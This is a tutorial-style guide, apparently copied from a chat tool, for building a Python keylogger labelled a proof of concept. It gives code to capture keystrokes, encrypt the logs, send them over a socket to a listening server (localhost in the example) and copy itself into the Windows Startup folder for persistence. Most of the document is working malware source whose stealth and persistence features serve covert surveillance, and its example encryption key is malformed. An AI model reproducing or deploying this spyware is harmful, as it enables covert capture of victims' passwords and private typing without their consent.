🔐 3. Keylogger with Encrypted Data Exfiltration (PoC)
📌 Objective
Create a Python-based keylogger that:

Captures keystrokes

Encrypts logs using cryptography.fernet

Stores them with a timestamp

Simulates data exfiltration to a local server

Adds startup persistence and a kill switch

🛠️ Tools & Libraries
pynput: For capturing keystrokes

cryptography: For data encryption

base64: For encoding/decoding

os, datetime, threading, socket, sys: Built-in modules

🧭 Step-by-Step Guide
✅ a. Capture Keystrokes using pynput
python
Copy
Edit
from pynput import keyboard

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(f"{key.char}")
    except AttributeError:
        keystrokes.append(f"[{key}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()
✅ b. Encrypt Data using cryptography.fernet
python
Copy
Edit
from cryptography.fernet import Fernet

# Generate key (do this once and store securely)
# key = Fernet.generate_key()
key = b'my-static-key12345678901234567890=='  # example (use your generated one)
cipher = Fernet(key)

def encrypt_log(log):
    return cipher.encrypt(log.encode())
✅ c. Store Logs Locally with Timestamps
python
Copy
Edit
from datetime import datetime

def save_encrypted_log(data):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    encrypted_data = encrypt_log("".join(data))
    with open(f"logs/{timestamp}.log", "wb") as f:
        f.write(encrypted_data)
✅ d. Simulate Sending to a Remote Server (localhost)
Client:

python
Copy
Edit
import socket

def send_to_server(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('localhost', 9999))
    s.send(encrypt_log(data))
    s.close()
Server (run separately):

python
Copy
Edit
import socket
from cryptography.fernet import Fernet

key = b'my-static-key12345678901234567890=='  # same as client
cipher = Fernet(key)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 9999))
server.listen(5)
print("[*] Listening on port 9999...")

while True:
    client, addr = server.accept()
    data = client.recv(4096)
    print(f"[+] Encrypted: {data}")
    print(f"[+] Decrypted: {cipher.decrypt(data).decode()}")
    client.close()
✅ e. Add Startup Persistence & Kill Switch (Optional & OS-Specific)
Startup Persistence (Windows):

python
Copy
Edit
import os
import shutil

def add_to_startup():
    file_path = os.path.realpath(__file__)
    target = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe')
    shutil.copy(file_path, target)
Kill Switch Example:

python
Copy
Edit
def check_kill_switch():
    return os.path.exists("STOP_LOGGING.txt")
📁 Folder Structure
arduino
Copy
Edit
keylogger/
│
├── keylogger.py
├── logs/
└── STOP_LOGGING.txt  # Optional kill switch
✅ Deliverables
keylogger.py: Full Python script with all modules

logs/: Folder containing encrypted logs

key: Static Fernet key (for test use only)

README.md: Ethical use disclaimer
